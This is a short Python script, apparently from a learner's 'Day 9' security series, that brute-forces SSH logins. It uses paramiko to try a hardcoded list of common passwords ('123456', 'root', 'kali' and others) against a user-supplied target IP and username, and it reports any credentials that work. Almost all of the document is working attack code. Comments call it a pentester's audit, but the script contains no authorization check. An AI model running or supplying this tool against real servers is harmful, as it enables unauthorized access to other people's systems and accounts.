# DAY 9 - SSH BRUTE FORCER
#SSH - ENCRYPTED NETWORK PROTOCOL OPERATING ON PORT 22.
#SYSTEM ADMINS USE IT TO LOG INTO REMOTE LINUX SERVERS SECURELY
#PENTESTER TO CHUCK FOR WEAK DEFAULT OR EASY PASSWORDS ON CORPORATE SERVERS
import paramiko
import time
import sys
def audit_ssh_credentials(hostname, username, password_list):
    print(f"\n Target HOST      : {hostname}")
    print(f"\n TARGET USER      : {username}")
    print("LAUNCHING AUTHENTICATION AUDIT ENGINE...")
    print("="*60)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    attempts = 0
    start_time = time.time()

    for password in password_list:
        attempts += 1
        password = password.strip()

        print(f"ATTEMPT {attempts}: TESTING PASSWORD -- {password}", end = "\r")
        try:
            client.connect(
                hostname = hostname,
                port = 22,
                username = username,
                password = password,
                timeout = 3,
                allow_agent = False,
                look_for_keys=False
            )
            duration = time.time() - start_time
            print("\n" + "="*60)
            print(f"SUCCESS VALID CREDENTIALS IDENTIFIED!!")
            print(f"    -> Host: {hostname}")
            print(f"    -> Username: {username}")
            print(f"    -> Password: {password}")
            print(f"    -> FOUND IN {duration:.4f} seconds after {attempts} tries")
            print("="*60)

            client.close()
            return True
        except paramiko.AuthenticationException:
            continue
        except paramiko.SSHException as e:
            print(f"[!]WARNING SSH PROT0COL ERROR ON PASSWORD '{password}' : {e} ")
            time.sleep(1)
            continue
        except Exception as e:
            print(f"ERROR IN CONNECTION: {e}")
            return False

    print("\n" + "="*60)
    print(f"WORDLIST  EXHAUSTED. ALL {attempts} passwords failed!!! ")
    return False
if __name__ == "__main__":
    print("="*60)
    print("        SSH SERVICE AUDITOR ENGINE       ")
    print("="*60)

    target_ip = input("Enter Target IP address:").strip()
    target_user = input("Enter Target User: ").strip()


    sample_passwords = [
        "123456", "password", "admin", "root", "secret123", "kali", "ubuntu"
    ]
    if target_ip and target_user:
        audit_ssh_credentials(target_ip, target_user, sample_passwords)
    else:
        print("ERROR: MISSING MANDATORY TARGET PARAMETERS.")





